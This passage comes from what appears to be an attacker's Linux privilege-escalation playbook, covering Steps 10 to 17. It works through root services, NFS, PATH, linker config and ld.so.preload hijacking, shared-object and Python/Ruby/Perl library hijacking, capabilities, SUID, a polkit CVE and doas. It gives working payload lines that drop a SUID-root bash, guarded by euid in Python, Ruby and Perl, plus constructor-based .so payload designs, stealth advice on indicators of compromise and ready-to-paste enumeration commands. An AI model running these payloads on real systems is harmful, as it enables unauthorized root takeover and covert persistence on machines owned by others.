(present in `MySQL UDF`). See the design note's "Related walkthrough audit" section for full context

`ps -ef | awk '$1=="root" && $8 !~ /^\[/'`

- `mysqld` running as root → [[MySQL UDF]]  (DOES THIS COVER MARIADB ALSO???)
- `postgres` running as root → [[Postgres UDF]]
- `redis-server` running as root → [[Redis Configuration File Write]]
- `org.apache.catalina.startup.Bootstrap` in cmdline args, running as root → [[Tomcat Manager WAR Deploy]]
- Any other root-owned service → [[Service Known Exploits]]
- Nothing → proceed

> **Architectural note.** Enumeration filters to UID=root by design. The rare case of a non-root daemon with a CVE that directly grants root is excluded by this filter. If that case is ever encountered, the response is pre-decided: drop the awk root filter, rename the step, update inline bullets with explicit "running as root" qualifiers, broaden Service Known Exploits to UID-agnostic. **No re-deliberation.** Full reasoning in Vault_Strategy.md `Decisions held` — search "service known exploits root-gating decision".

---

## Step 11 — NFS exports

`cat /etc/exports 2>/dev/null`

- Shows an export with `no_root_squash` → [[NFS no_root_squash]]
- Empty / no `no_root_squash` line → move on to the next step.

---

## Step 12 — PATH abuse

`echo $PATH; for d in $(echo $PATH | tr ':' ' '); do test -w "$d" && echo "WRITABLE: $d"; done`

- Any directory in `$PATH` writable by current user → [[PATH Hijack]]
- None writable → proceed

---

## Step 13 — Loader hijacking

### Dynamic linker configuration hijacking:

⚠️ `[[Dynamic Linker Configuration Hijack]]` walkthrough body — build-when-encountered. Points to include: (1) trigger mechanism is two-stage: (a) `ld.so` reads `/etc/ld.so.cache`, NOT the config files directly — a config file change has no effect until `ldconfig` is (re)invoked to rebuild the cache from `/etc/ld.so.conf` + `/etc/ld.so.conf.d/*.conf`, incorporating any newly-added attacker path; (b) at binary start `ld.so` looks up each linked library name in the (now-updated) cache — a root-run binary must subsequently start and its dynamic linking must resolve a library name to the attacker `.so`; both stages must occur post-deployment for the payload to fire (force-fire options for each stage: see point 5); (2) attack shape (writable file): append attacker-controlled directory path to existing file (overwrite-with-backup for restoration); (3) attack shape (writable dir): drop new `.conf` under `/etc/ld.so.conf.d/` naming attacker-controlled directory (cleanup: `rm` the file); (4) payload: malicious `.so` in the attacker-controlled directory, matching name of a legitimately-loaded library on a root-run binary — same construction as `[[Shared Object Hijack]]`; (5) triggering the load — deployment stages the linker-config change and the `.so`, but does not fire either stage; stage (a) `ldconfig` invocation: wait for package install / boot / cron-triggered `ldconfig`, or invoke directly via `sudo ldconfig` if a sudo entry allows; stage (b) consumer load: identify a candidate root-run consumer whose loaded library names include the attacker `.so` name via `ldd` against root-owned processes and known service binaries (walkthrough author to detail); once identified, options by consumer class: scheduler-invoked → wait for next scheduled fire; running service → wait for natural restart or reboot; sudo NOPASSWD → `sudo <consumer>` fires the load in root context; always-on daemon with no scheduled restart → typically requires reboot. **Foothold-user direct invocation of the consumer triggers the load but runs as foothold uid — no root escalation.** Root-context invocation is mandatory for stage (b); (6) IOC: on-disk artefact under `/etc/`; `ldconfig` invocation may be logged by package management or auditd.

On **target:**

`test -w /etc/ld.so.conf && echo "WRITABLE_LDCONFIG_FILE: /etc/ld.so.conf"; test -w /etc/ld.so.conf.d && echo "WRITABLE_LDCONFIG_DIR: /etc/ld.so.conf.d"; for f in /etc/ld.so.conf.d/*.conf; do [ -f "$f" ] && test -w "$f" && echo "WRITABLE_LDCONFIG_FILE: $f"; done; echo "LDCONFIG_SCANNED"`

Route on output markers:

- `WRITABLE_LDCONFIG_FILE: <path>` → [[Dynamic Linker Configuration Hijack]], use `<path>` as `<conf_file>`
- `WRITABLE_LDCONFIG_DIR: <dir>` → [[Dynamic Linker Configuration Hijack]], drop-new-file case, use `<dir>` as `<conf_dir>`
- `LDCONFIG_SCANNED` with no preceding `WRITABLE_LDCONFIG_*` → check completed cleanly, no writable linker config targets. Continue to next sub-block.
- No output at all → paste did not execute (terminal issue, syntax mangling, or connection drop). Retry.

---

### Dynamic linker preload hijacking:

⚠️ `[[Dynamic Linker Preload Hijack]]` walkthrough body — build-when-encountered. Points to include: (1) trigger mechanism: single-stage — at every ELF start, `ld.so` reads `/etc/ld.so.preload` and loads each listed `.so` before the ELF's own linked libraries; constructors (`__attribute__((constructor))`) fire before `main`; no cache, no `ldconfig` invocation required; no consumer identification — every root-run ELF triggers. Applies to SUID binaries (unlike `LD_PRELOAD` env var which is stripped for setuid); (2) attack shape (add new entry — writable preload file): append attacker `.so` path to `/etc/ld.so.preload` (overwrite-with-backup for restoration, sticky-safe, preserves inode); (3) attack shape (overwrite existing entry — writable listed `.so` file): overwrite-with-backup the referenced `.so` (sticky-safe, preserves inode); (4) attack shape (rename-swap existing entry — writable containing dir of listed `.so`): rename original `.so`, drop attacker `.so` at same name (breaks under sticky bit; unlink-and-replace as destructive fallback); (5) payload: `.so` with constructor whose first action is (a) `geteuid() == 0` guard — silent no-op for non-root fires (SUID bit on a foothold-owned file gives foothold-euid, not root; only root-context constructor fires create a root-owned SUID drop); (b) drop a SUID-root shell to an operator-selected writable non-`nosuid` path (see `[[Stealth Drop Dir Probe]]` for path selection, pattern matches `[[Dirty COW (CVE-2016-5195)]]`) via `cp /bin/bash <drop>` + `chmod 4755 <drop>`, or a compiled `setresuid+execve` wrapper for hardened targets; (c) reverse the attack-shape mutation to kill the trigger — restore original preload file content (add-entry) or restore original `.so` from backup (overwrite/rename-swap); backup path is hardcoded in the `.so` source at build time. Order (a)→(b)→(c) is deliberate: drop before reversal so a reversal error still leaves the SUID drop in place; conversely a drop error leaves the trigger armed for another root fire on next ELF start. Attacker then invokes `<drop> -p` from foothold shell — decoupled from trigger stdio. Build: `gcc -shared -fPIC -o <so> <src.c>`; (6) triggering the load — deployment stages the change but does not fire it. Constructor fires on the next ELF start. Foothold-uid fires are silent no-ops per (5a); root-context fires produce the SUID drop and self-clean the trigger per (5b)+(5c). Operator polls for drop appearance (`while [ ! -e <drop> ]; do sleep <n>; done`); force-fire via any sudo NOPASSWD available for immediate root exec, otherwise wait for root cron / service invocation / ssh login / daemon respawn; (7) ⚠️ **payload selection critical + verify self-cleaning**: runtime IOC is bounded ONLY via the ordered self-cleaning payload above. Any payload without (5a) uid guard OR without (5c) mutation-reversal produces catastrophic runtime IOC — every ELF start system-wide fires; unguarded shell spawns die on headless stdio, flood auditd, break every command. After the drop appears, operator **manually verifies** reversal — add-entry: `grep` shows attacker entry absent from preload file; overwrite/rename-swap: `sha256sum` matches original hash. If reversal failed, restore manually before invoking `<drop> -p` — otherwise the trigger remains armed; (8) on-disk IOC: transient under the (5c)-cleaning payload — modified `/etc/ld.so.preload` or modified/replaced `.so` visible until the first root-context fire reverses it; post-fire only the SUID drop remains until operator cleans up. Auditd (if enabled) captures the transient window.

On **target:**

`test -w /etc/ld.so.preload && echo "WRITABLE_LDPRELOAD_FILE: /etc/ld.so.preload"; [ -f /etc/ld.so.preload ] && for p in $(cat /etc/ld.so.preload 2>/dev/null); do case "$p" in */*) test -w "$p" && echo "WRITABLE_LDPRELOAD_ENTRY_FILE: $p"; d=$(dirname "$p"); test -w "$d" && echo "WRITABLE_LDPRELOAD_ENTRY_DIR: $d";; esac; done; echo "LDPRELOAD_SCANNED"`

Route on output markers:

- `WRITABLE_LDPRELOAD_FILE: <path>` → [[Dynamic Linker Preload Hijack]], add-entry variant, use `<path>` as `<preload_file>`
- `WRITABLE_LDPRELOAD_ENTRY_FILE: <path>` → [[Dynamic Linker Preload Hijack]], overwrite-entry variant, use `<path>` as `<entry_file>`
- `WRITABLE_LDPRELOAD_ENTRY_DIR: <dir>` → [[Dynamic Linker Preload Hijack]], rename-swap-entry variant, use `<dir>` as `<entry_dir>`
- `LDPRELOAD_SCANNED` with no preceding `WRITABLE_LDPRELOAD_*` → check completed cleanly, no writable preload targets. Continue to next sub-block.
- No output at all → paste did not execute (terminal issue, syntax mangling, or connection drop). Retry.

---

### Shared object hijacking (system paths):

⚠️ `[[Shared Object Hijack]]` walkthrough body — build-when-encountered. Walkthrough is unified across both shared-object sub-blocks (system paths + RPATH/RUNPATH) and branches at top on marker tag. Points to include: (1) trigger: `ld.so` at binary start resolves each `.so` against a search list; two exploitable primitives — writable directory on the list, OR writable `.so` file at a resolved path; on load the constructor (`__attribute__((constructor))`) fires before `main`; (2) payload: `.so` with constructor whose first action is (a) `geteuid() == 0` guard — silent no-op for foothold-uid consumer invocations (SUID bit on a foothold-owned drop gives foothold-euid, not root); (b) drop a SUID-root shell to an operator-selected writable non-`nosuid` path (see `[[Stealth Drop Dir Probe]]` for path selection) via `cp /bin/bash <drop>` + `chmod 4755 <drop>`, or a compiled `setresuid+execve` wrapper for hardened targets. Attacker then invokes `<drop> -p` from foothold shell — decoupled from trigger stdio (essential for cron / systemd timer / running service / always-on daemon triggers where the constructor inherits /dev/null-like stdio and inline `system("/bin/bash -p")` dies on EOF; also correct for sudo NOPASSWD triggers where operator-attached stdio would work with an inline shell, but SUID drop is universal). Build: `gcc -shared -fPIC -o <so> <src.c>`; (3) deployment variants gated by marker's FILE/DIR half: overwrite-with-backup (`WRITABLE_SO_FILE`, sticky-safe, preserves inode), rename-swap (`WRITABLE_SO_DIR`, breaks under sticky bit, restoration preserves inode), unlink-and-replace (`WRITABLE_SO_DIR`, destructive fallback); (4) consumer-identification branches on marker tag — untagged marker (from this sub-block) → walkthrough must identify a root-run consumer that links the target `.so` (via `ldd` against root-owned processes and known service binaries — walkthrough author to detail); tagged marker `WRITABLE_SO_*[<binary>]` (from RPATH/RUNPATH sub-block) → consumer is `<binary>` from tag, skip identification; (5) triggering the load — deployment stages the `.so` but does not fire it; the consumer must be invoked in a root context after deployment for the payload to run. Options by consumer class: scheduler-invoked (cron / systemd timer / anacron) → wait for next scheduled fire; running systemd service → wait for natural restart or reboot (foothold-triggered restart needs a writable unit / drop-in — Step 6 territory, not Step 12); sudo NOPASSWD to foothold user → `sudo <consumer>` fires the load in root context; always-on daemon with no scheduled restart → hardest case, typically requires reboot or a legitimate SIGHUP/watchdog respawn path. **Foothold-user direct invocation of the consumer triggers the constructor but runs as foothold uid — no root escalation.** Root-context invocation is mandatory.

⚠️ **Build-when-encountered.** `~/scripts/so_system_enum.sh` is deferred — no script body exists yet. On first real-box encounter: build the script from first principles against the live target (canonical validation context), conforming to the marker contract below. Marker contract is the locked architectural shape only — specific marker names and field structure may refine when the script is written against real linker-search output. Enum scope for this scaffold: parse `/etc/ld.so.conf`, expanding any `include <glob>` directives (typically `include /etc/ld.so.conf.d/*.conf`) to collect all configured search directories; union with default paths `/lib`, `/usr/lib`, `/lib64`, `/usr/lib64`; resolve symlinks and deduplicate by resolved path (usrmerge distros symlink `/lib` → `/usr/lib` and `/lib64` → `/usr/lib64` — dedupe avoids duplicate markers); for each unique directory, independently test the directory itself for writability (emit `WRITABLE_SO_DIR: <dir>` if writable) AND iterate `*.so*` files inside testing each for writability (glob matches versioned libraries like `libfoo.so.1.2.3` which are the norm; emit `WRITABLE_SO_FILE: <path>` per hit). FILE and DIR checks are independent — both may fire on the same directory when the dir is writable AND a file inside is directly writable (unusual but valid). Markers are intentionally untagged — consumer-binary identification is not performed by this enum because tagging would require `ldd`-scanning candidate binaries per finding, adding process-invocation noise this near-silent sub-block is designed to avoid; the walkthrough handles consumer identification per-marker. **Drift warning — cross-script duplication:** the system-paths parse block (parsing `/etc/ld.so.conf`, expanding `include` globs, unioning with defaults, resolving symlinks, deduping) is duplicated in `so_rpath_enum.sh` where it is used as a filter set. Any change to the parse logic here MUST be mirrored in `so_rpath_enum.sh`. When building this script, wrap the parse block with a comment banner naming the sibling script and the parity requirement, so any future edit surfaces the coupling.

Once `~/scripts/so_system_enum.sh` exists, invoke per the `Scheduled execution` pattern:

On **attacker**:

`(echo "bash <<'EOF'"; sed -e '/^[[:space:]]*#/d' -e '/^[[:space:]]*$/d' ~/scripts/so_system_enum.sh; echo "EOF") | xclip -selection clipboard`

(Wayland: substitute `wl-copy` for `xclip -selection clipboard`.)

Paste into target shell.

Route on output markers:

- `WRITABLE_SO_FILE: <path>` → [[Shared Object Hijack]], system-paths variant, use `<path>` as `<so_file>`
- `WRITABLE_SO_DIR: <dir>` → [[Shared Object Hijack]], system-paths variant, drop-new-file case, use `<dir>` as `<so_dir>`
- `SO_SYSTEM_SCANNED` with no preceding `WRITABLE_SO_*` → check completed cleanly, no writable shared object targets on system paths. Continue to next sub-block.
- No output at all → paste did not execute (terminal issue, syntax mangling, or connection drop). Retry.

### Shared object hijacking (RPATH/RUNPATH):

⚠️ **Elevated IOC.** This sub-block runs `readelf -d` against binaries in `/usr/bin`, `/usr/sbin`, `/bin`, `/sbin`, `/usr/local/bin`, `/usr/local/sbin`, `/opt` — a burst of 1500–3000 short-lived process invocations, detectable by auditd process-telemetry and EDR. Comparable IOC class to Step 14's SUID `find`, not silent. Per-engagement skip decision belongs here — on high-monitoring targets, skip this sub-block and proceed directly to Interpreted-language library hijacking.

⚠️ Routes to `[[Shared Object Hijack]]` (same walkthrough as system-paths sub-block above); tagged markers `WRITABLE_SO_*[<binary>]` carry the consumer binary in the tag, so the walkthrough skips its consumer-identification step for these.

⚠️ **Build-when-encountered.** `~/scripts/so_rpath_enum.sh` is deferred — no script body exists yet. On first real-box encounter: build the script from first principles against the live target (canonical validation context), conforming to the marker contract below. Marker contract is the locked architectural shape only — specific marker names and field structure may refine when the script is written against real `readelf` output. Enum scope for this scaffold: at start, independently build the system-paths set by parsing `/etc/ld.so.conf` (expanding any `include <glob>` directives, typically `/etc/ld.so.conf.d/*.conf`) unioned with default `/lib`, `/usr/lib`, `/lib64`, `/usr/lib64`, resolving symlinks and deduplicating — same algorithm as `so_system_enum.sh` but independently computed (the two scripts don't communicate); this set is used solely as a filter to prevent duplicate markers, not as an enumeration target. **Drift warning — cross-script duplication:** this parse block is functionally identical to the one in `so_system_enum.sh`. Any change to the parse logic here MUST be mirrored in `so_system_enum.sh`. When building this script, wrap the parse block with a comment banner naming the sibling script and the parity requirement, so any future edit surfaces the coupling. Then run `readelf -d` against binaries in the standard-location set (`/usr/bin`, `/usr/sbin`, `/bin`, `/sbin`, `/usr/local/bin`, `/usr/local/sbin`, `/opt`); extract `RPATH` and `RUNPATH` entries from each ELF's dynamic section; exclude any entries whose resolved path is in the system-paths filter set; for each remaining path, test the directory itself for writable (emit `WRITABLE_SO_DIR[<binary>]: <dir>`) AND iterate `*.so*` files inside testing each for writable (emit `WRITABLE_SO_FILE[<binary>]: <path>` per hit). `<binary>` in the tag is the ELF the RPATH/RUNPATH was read from — one path may fire markers under multiple `<binary>` tags if multiple binaries share it. Statically-linked binaries and non-ELF files: `readelf -d` returns no dynamic section — skip silently. Symlink handling: resolve to real binary before `readelf` to avoid duplicate work on aliases.

Once `~/scripts/so_rpath_enum.sh` exists, invoke per the `Scheduled execution` pattern:

On **attacker**:

`(echo "bash <<'EOF'"; sed -e '/^[[:space:]]*#/d' -e '/^[[:space:]]*$/d' ~/scripts/so_rpath_enum.sh; echo "EOF") | xclip -selection clipboard`

(Wayland: substitute `wl-copy` for `xclip -selection clipboard`.)

Paste into target shell.

Route on output markers:

- `WRITABLE_SO_FILE[<binary>]: <path>` → [[Shared Object Hijack]], RPATH/RUNPATH variant, consumer known (`<binary>`), use `<path>` as `<so_file>`
- `WRITABLE_SO_DIR[<binary>]: <dir>` → [[Shared Object Hijack]], RPATH/RUNPATH variant, consumer known (`<binary>`), drop-new-file case, use `<dir>` as `<so_dir>`
- `SO_RPATH_SCANNED` with no preceding `WRITABLE_SO_*[<binary>]` → check completed cleanly, no writable RPATH/RUNPATH targets. Continue to next sub-block.
- No output at all → paste did not execute (terminal issue, syntax mangling, or connection drop). Retry.

### Interpreted-language library hijacking (default paths):

⚠️ `[[Python Library Hijack]]` / `[[Ruby Library Hijack]]` / `[[Perl Library Hijack]]` walkthrough bodies — build-when-encountered. Walkthroughs are unified across both interpreted sub-blocks (default paths + per-script custom paths) and branch at top on marker tag. Shared structure across all three languages: (1) trigger: interpreter module loader (Python `import` / Ruby `require` / Perl `use`) at import resolves module against a search list; two exploitable primitives — writable directory on the list, OR writable module file at a resolved path; on load, top-level code executes as side-effect; (2) payload: top-level code with (a) EUID-0 guard — silent no-op for foothold-uid consumer invocations (SUID bit on a foothold-owned drop gives foothold-euid, not root); (b) shell out to drop a SUID-root shell — `cp /bin/bash <drop> && chmod 4755 <drop>` where `<drop>` is selected via `[[Stealth Drop Dir Probe]]`. Attacker then invokes `<drop> -p` from foothold shell — decoupled from trigger stdio (essential for cron / systemd timer / running service triggers where the interpreter inherits /dev/null-like stdio and inline `system("/bin/bash -p")` dies on EOF; also correct for sudo NOPASSWD triggers where operator-attached stdio would work with an inline shell, but SUID drop is universal). Per-language: Python — `import os; os.geteuid()==0 and os.system("cp /bin/bash <drop> && chmod 4755 <drop>")`; Ruby — `system("cp /bin/bash <drop> && chmod 4755 <drop>") if Process.euid == 0`; Perl — `system("cp /bin/bash <drop> && chmod 4755 <drop>") if $> == 0`; (3) deployment variants gated by marker's FILE/DIR half: overwrite-with-backup (`WRITABLE_*_LIB_FILE`, sticky-safe, preserves inode), rename-swap (`WRITABLE_*_LIB_DIR`, breaks under sticky bit), unlink-and-replace (`WRITABLE_*_LIB_DIR`, destructive fallback); (4) consumer-identification branches on marker tag — untagged marker (from this sub-block) → walkthrough must identify a root-run script that imports the target module (cron entries pointing at `.py`/`.rb`/`.pl`, systemd `ExecStart=/usr/bin/<interp> <script>`, sudo NOPASSWD interpreted scripts — walkthrough author to detail); tagged marker `WRITABLE_<LANG>_LIB_*[<script>]` (from per-script custom-paths sub-block) → consumer is `<script>` from tag, skip identification; (5) triggering the load — deployment stages the module but does not fire it; the consumer script must be invoked in a root context after deployment for the payload to run. Options by consumer class: cron / systemd timer script → wait for next scheduled invocation; running systemd service → wait for natural restart or reboot; sudo NOPASSWD interpreted script → `sudo <interp> <script>` (or `sudo <script>` if directly executable) fires the load in root context. **Foothold-user direct invocation triggers the payload but runs as foothold uid — no root escalation.** Root-context invocation is mandatory; (6) per-language quirks: Python — `.pyc` cache regeneration in `__pycache__/`; `sys.path` order (script dir → `PYTHONPATH` → site-packages). Ruby — `$LOAD_PATH` order; gem vs loose module distinction. Perl — `@INC` order; `.pm` naming conventions.

⚠️ **Build-when-encountered.** `~/scripts/interpreter_default_lib_enum.sh` is deferred — no script body exists yet. On first real-box encounter: build the script from first principles against the live target (canonical validation context), conforming to the marker contract below. Marker contract is the locked architectural shape only — specific marker names and field structure may refine when the script is written against real interpreter output. Enum scope for this scaffold: for each language whose interpreter is present (`command -v python3` / `ruby` / `perl` — extensible to node/lua/php-cli if encountered), retrieve default module search paths via runtime introspection with no script context (`python3 -c 'import sys; print("\n".join(sys.path))'` / `ruby -e 'puts $LOAD_PATH'` / `perl -e 'print join("\n",@INC)'`); resolve symlinks and deduplicate by resolved path; for each unique directory, independently test the directory itself for writability (emit `WRITABLE_<LANG>_LIB_DIR: <dir>`) AND iterate module files inside testing each for writability (Python `*.py`; Ruby `*.rb`; Perl `*.pm`; emit `WRITABLE_<LANG>_LIB_FILE: <path>` per hit). FILE and DIR checks are independent. Markers are intentionally untagged — consumer-script identification is not performed by this enum, parallel to the SO system-paths sub-block and for the same reason: tagging would require inspecting candidate consumer scripts per finding, adding file-read noise this near-silent sub-block is designed to avoid; the walkthrough handles consumer identification per-marker. **Drift warning — cross-script duplication:** the default-paths introspection commands (Python `sys.path`, Ruby `$LOAD_PATH`, Perl `@INC` via runtime introspection with no script context) are duplicated in `interpreter_custom_lib_enum.sh` where they build a filter set. Any change to the introspection logic here MUST be mirrored in `interpreter_custom_lib_enum.sh`. When building this script, wrap the introspection block with a comment banner naming the sibling script and the parity requirement, so any future edit surfaces the coupling.

Once `~/scripts/interpreter_default_lib_enum.sh` exists, invoke per the `Scheduled execution` pattern:

On **attacker**:

`(echo "bash <<'EOF'"; sed -e '/^[[:space:]]*#/d' -e '/^[[:space:]]*$/d' ~/scripts/interpreter_default_lib_enum.sh; echo "EOF") | xclip -selection clipboard`

(Wayland: substitute `wl-copy` for `xclip -selection clipboard`.)

Paste into target shell.

Route on output markers:

- `WRITABLE_PYTHON_LIB_FILE: <path>` → [[Python Library Hijack]], default-paths variant, use `<path>` as `<lib_file>`
- `WRITABLE_PYTHON_LIB_DIR: <dir>` → [[Python Library Hijack]], default-paths variant, drop-new-file case, use `<dir>` as `<lib_dir>`
- `WRITABLE_RUBY_LIB_FILE: <path>` → [[Ruby Library Hijack]], default-paths variant, use `<path>` as `<lib_file>`
- `WRITABLE_RUBY_LIB_DIR: <dir>` → [[Ruby Library Hijack]], default-paths variant, drop-new-file case, use `<dir>` as `<lib_dir>`
- `WRITABLE_PERL_LIB_FILE: <path>` → [[Perl Library Hijack]], default-paths variant, use `<path>` as `<lib_file>`
- `WRITABLE_PERL_LIB_DIR: <dir>` → [[Perl Library Hijack]], default-paths variant, drop-new-file case, use `<dir>` as `<lib_dir>`
- `INTERPRETED_LANG_DEFAULT_LIBS_SCANNED` with no preceding `WRITABLE_*_LIB_*` → check completed cleanly, no writable interpreted-language default-path library targets. Continue to next sub-block.
- No output at all → paste did not execute (terminal issue, syntax mangling, or connection drop). Retry.

### Interpreted-language library hijacking (per-script custom paths):

⚠️ Routes to `[[Python Library Hijack]]` / `[[Ruby Library Hijack]]` / `[[Perl Library Hijack]]` (same walkthroughs as default-paths sub-block above); tagged markers `WRITABLE_<LANG>_LIB_*[<script>]` carry the consumer script in the tag, so the walkthroughs skip their consumer-identification step for these.

⚠️ **Build-when-encountered.** `~/scripts/interpreter_custom_lib_enum.sh` is deferred — no script body exists yet. On first real-box encounter: build the script from first principles against the live target (canonical validation context), conforming to the marker contract below. Marker contract is the locked architectural shape only — specific marker names and field structure may refine when the script is written against real target inputs. Enum scope for this scaffold:
1. Enumerate candidate consumer scripts from multiple sources — root's cron entries (`crontab -l -u root`, `/etc/crontab`, `/etc/cron.{d,hourly,daily,weekly,monthly}/*`); systemd units with interpreted `ExecStart=` (`/etc/systemd/system/*.service`, `/lib/systemd/system/*.service`); sudoers NOPASSWD entries pointing at interpreted scripts (`sudo -l 2>/dev/null`); init.d scripts with interpreter shebangs (`/etc/init.d/*`).
2. For each candidate consumer script, identify the language from shebang or interpreter invocation. Inspect the script body for custom path modifications: Python — `sys.path.append(...)` / `sys.path.insert(...)`; Ruby — `$LOAD_PATH.unshift(...)` / `$LOAD_PATH.push(...)`; Perl — `use lib '<path>'` / `push @INC, '<path>'` / `unshift @INC, '<path>'`. Extract path arguments.
3. Inspect the invocation environment for env-driven paths: Python `PYTHONPATH`, Ruby `RUBYLIB`, Perl `PERL5LIB` (colon-separated). Extract paths.
4. Independently build the default-paths set for each language (same introspection as `interpreter_default_lib_enum.sh` — see drift warning below); union of extracted per-script + env-driven paths, filter out any already in the language's default-paths set (avoid duplicate markers with default-paths sub-block).
5. For each remaining path, test the directory itself for writability (emit `WRITABLE_<LANG>_LIB_DIR[<script>]: <dir>`) AND iterate module files inside (`*.py` / `*.rb` / `*.pm`) testing each for writability (emit `WRITABLE_<LANG>_LIB_FILE[<script>]: <path>` per hit). `<script>` in the tag is the consumer script from step 1 — one path may fire markers under multiple `<script>` tags if multiple scripts reference the same custom path.

**Drift warning — cross-script duplication:** the default-paths introspection block (Python `sys.path`, Ruby `$LOAD_PATH`, Perl `@INC`) is functionally identical to the one in `interpreter_default_lib_enum.sh`. Any change to the introspection logic here MUST be mirrored in `interpreter_default_lib_enum.sh`. When building this script, wrap the introspection block with a comment banner naming the sibling script and the parity requirement, so any future edit surfaces the coupling.

Once `~/scripts/interpreter_custom_lib_enum.sh` exists, invoke per the `Scheduled execution` pattern:

On **attacker**:

`(echo "bash <<'EOF'"; sed -e '/^[[:space:]]*#/d' -e '/^[[:space:]]*$/d' ~/scripts/interpreter_custom_lib_enum.sh; echo "EOF") | xclip -selection clipboard`

(Wayland: substitute `wl-copy` for `xclip -selection clipboard`.)

Paste into target shell.

Route on output markers:

- `WRITABLE_PYTHON_LIB_FILE[<script>]: <path>` → [[Python Library Hijack]], per-script custom-paths variant, consumer known (`<script>`), use `<path>` as `<lib_file>`
- `WRITABLE_PYTHON_LIB_DIR[<script>]: <dir>` → [[Python Library Hijack]], per-script custom-paths variant, consumer known (`<script>`), drop-new-file case, use `<dir>` as `<lib_dir>`
- `WRITABLE_RUBY_LIB_FILE[<script>]: <path>` → [[Ruby Library Hijack]], per-script custom-paths variant, consumer known (`<script>`), use `<path>` as `<lib_file>`
- `WRITABLE_RUBY_LIB_DIR[<script>]: <dir>` → [[Ruby Library Hijack]], per-script custom-paths variant, consumer known (`<script>`), drop-new-file case, use `<dir>` as `<lib_dir>`
- `WRITABLE_PERL_LIB_FILE[<script>]: <path>` → [[Perl Library Hijack]], per-script custom-paths variant, consumer known (`<script>`), use `<path>` as `<lib_file>`
- `WRITABLE_PERL_LIB_DIR[<script>]: <dir>` → [[Perl Library Hijack]], per-script custom-paths variant, consumer known (`<script>`), drop-new-file case, use `<dir>` as `<lib_dir>`
- `INTERPRETED_LANG_CUSTOM_LIBS_SCANNED` with no preceding `WRITABLE_*_LIB_*[<script>]` → check completed cleanly, no writable interpreted-language custom-path library targets. Continue to next section.
- No output at all → paste did not execute (terminal issue, syntax mangling, or connection drop). Retry.

### No route:

No markers from any sub-block → no loader-hijacking PrivEsc route, proceed to Step 14

---

## Step 14 — Capabilities

`getcap -r / 2>/dev/null`

(**Is there a coverage gap with this step, I think probably yes. This step enumerates FILE caps (`getcap -r /`), but does not enumerate RUNNING PROCESS caps (`getpcaps <pid>`)**). 

- `cap_setuid+ep` on standard binary (e.g. `/usr/bin/python3`, `/usr/bin/perl`) → [[Capability Abuse]]
- `cap_dac_read_search+ep` on accessible binary → [[Capability Abuse]]
- `cap_sys_admin+ep` on accessible binary → [[Capability Abuse]]
- Nothing → proceed

---

## Step 15 — SUID / SGID binaries

⚠️ High IOC. Full filesystem traversal — run once; the technique walkthroughs reuse this output, they do not re-run the `find`.

`find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} + 2>/dev/null`

(No output → proceed to Step 16)

Try the below technique walkthroughs in stealth-first order. Each receives this list (the output from the above command), self-selects the binaries it applies to, loops them, and returns here on exhaustion to try the next:

1. [[SUID Known Exploits]]
2. [[SUID Shared Object Injection]]
3. [[SUID Environment Variables]]
4. [[SUID Function Export Hijack]]
5. [[SUID PS4 Debug Trace]]

All five exhausted with no elevation → proceed to Step 16.

---

## Step 16 — Narrow-applicability vectors

### CVE-2018-19788 — polkit UID>INT_MAX authentication bypass:

On **target:**

`test "$(id -u)" -gt 2147483647 && echo "BIG_UID: $(id -u)"; echo "BIG_UID_SCANNED"`

Route on output markers:

- `BIG_UID: <uid>` → run: `systemd-run -t /bin/bash`
    - Interactive root shell prompt → verify root by running `id` → `uid=0(...)` → root authority achieved. Done.
    - GLib assertion error / SELinux denial / `command not found` → payload blocked (patched polkit, SELinux enforcing `user_t`, or `systemd-run` absent). Proceed to next narrow-vector check.
- `BIG_UID_SCANNED` with no preceding `BIG_UID` → INAPPLICABLE, proceed to next narrow-vector check.
- No output at all → paste did not execute (terminal issue, syntax mangling, or connection drop). Retry.

### DOAS entitlements:

On **target:**

`command -v doas >/dev/null 2>&1 && test -f /etc/doas.conf && echo "DOAS_INSTALLED"; echo "DOAS_SCANNED"`

Route on output markers:

- `DOAS_INSTALLED` → run trivial permit-nopass check across common shell paths:

     `for s in /bin/sh /bin/bash /bin/ksh /bin/dash /bin/zsh /bin/ash; do [ -x "$s" ] && [ "$(doas -C /etc/doas.conf "$s" 2>/dev/null)" = "permit nopass" ] && echo "DOAS_NOPASS_SHELL: $s" && break; done; echo "DOAS_SHELL_SCANNED"`

    - `DOAS_NOPASS_SHELL: <shell>` → run `doas <shell>` → interactive root shell → verify root by running `id` → `uid=0(...)` → root authority achieved. Done.
    - `DOAS_SHELL_SCANNED` with no preceding `DOAS_NOPASS_SHELL` → no trivial shell catch; route to [[Sudo Shell Escape]] - doas branch (**doas branch note NOT yet built**, see [[Sudo Shell Escape DOAS Unification]]; refactor deferred to build-when-encountered).
- `DOAS_SCANNED` with no preceding `DOAS_INSTALLED` → INAPPLICABLE, proceed to next narrow-vector check.
- No output at all → paste did not execute (terminal issue, syntax mangling, or connection drop). Retry.

### ifcfg-* NAME injection (CentOS/RHEL network-scripts):

On **target:**

`test -d /etc/sysconfig/network-scripts && find -L /etc/sysconfig/network-scripts -maxdepth 1 -type f -name 'ifcfg-*' -writable -printf 'IFCFG_WRITABLE: %p\n' 2>/dev/null; test -w /etc/sysconfig/network-scripts && echo "IFCFG_DIR_WRITABLE: /etc/sysconfig/network-scripts"; echo "IFCFG_SCANNED"`

Route on output markers:

- `IFCFG_WRITABLE: <file>` OR `IFCFG_DIR_WRITABLE: <dir>` → [[ifcfg NAME Injection]] (walkthrough not built — see [[ifcfg NAME Injection Walkthrough]] design note; deferred to build-when-encountered).
- `IFCFG_SCANNED` with no preceding `IFCFG_WRITABLE` or `IFCFG_DIR_WRITABLE` → INAPPLICABLE, proceed to Step 17.
- No output at all → paste did not execute (terminal issue, syntax mangling, or connection drop). Retry.

---

## Step 17 — Kernel exploits

⚠️ Kernel exploits risk kernel panics — box may need reset. Run only after Steps 0–16 fall through.

`uname -r`

Record as `<kernel_version>` (e.g. `2.6.32-5-amd64`).

`for f in /etc/os-release /etc/debian_version /etc/redhat-release /etc/lsb-release /etc/issue; do echo "--- $f ---"; cat "$f" 2>/dev/null || echo "(absent)"; done`

From the populated files, identify and record `<distro>` (e.g. Debian, Ubuntu, RHEL, CentOS) and `<major_version>` (e.g. 6, 16, 7).

- Check in vault for `OS Exploit Index/Linux/<Distro> <Major version>.md`. If matching file, does the file's Applicable exploits table have a row matching `<kernel_version>` in the `Build` column AND `PrivEsc` in the `Stage` column → if yes, run that row's Walkthrough
- Otherwise → proceed

---

